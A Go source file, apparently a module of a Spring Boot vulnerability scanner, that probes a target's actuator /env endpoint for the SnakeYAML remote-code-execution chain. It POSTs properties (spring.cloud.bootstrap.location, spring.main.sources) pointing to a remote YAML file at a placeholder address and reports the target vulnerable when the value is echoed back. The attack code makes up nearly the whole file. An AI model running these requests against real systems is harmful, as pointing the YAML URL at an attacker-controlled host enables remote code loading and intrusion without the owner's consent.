package exppackage

import (
	"bytes"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"ssp/common"
)

func SnakeYAML_RCE(url string) {

	oldHeaders1 := map[string]string{
		"User-Agent":   "Your_User_Agent_Here",
		"Content-Type": "application/x-www-form-urlencoded",
	}
	oldHeaders2 := map[string]string{
		"User-Agent":   "Your_User_Agent_Here",
		"Content-Type": "application/json",
	}

	payload1 := "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
	payload2 := `{"name":"spring.main.sources","value":"http://127.0.0.1/example.yml"}`

	Headers1 := common.MergeHeaders(oldHeaders1)
	Headers2 := common.MergeHeaders(oldHeaders2)

	client := &http.Client{}

	req1, err := http.NewRequest("POST", url+"env", bytes.NewBufferString(payload1))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range Headers1 {
		req1.Header.Set(key, value)
	}

	resp1, err := client.Do(req1)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp1.Body.Close()

	req2, err := http.NewRequest("POST", url+"env", bytes.NewBufferString(payload2))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range Headers2 {
		req2.Header.Set(key, value)
	}

	resp2, err := client.Do(req2)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp2.Body.Close()

	bodyBytes1, err := ioutil.ReadAll(resp1.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}
	bodyString1 := string(bodyBytes1)

	bodyBytes2, err := ioutil.ReadAll(resp2.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}
	bodyString2 := string(bodyBytes2)

	if resp1.StatusCode == 200 && resp2.StatusCode == 200 {
		if bytes.Contains([]byte(bodyString1), []byte("example.yml")) {
			common.PrintVulnerabilityConfirmation("SnakeYAML_RCE-1", url+"env", payload1, "9")
		} else if bytes.Contains([]byte(bodyString2), []byte("example.yml")) {
			common.PrintVulnerabilityConfirmation("SnakeYAML_RCE-2", url+"env", payload2, "9")
		} else {
			color.Yellow("[-] %s 未发现SnakeYAML-RCE漏洞\n", url)
		}
	}
}
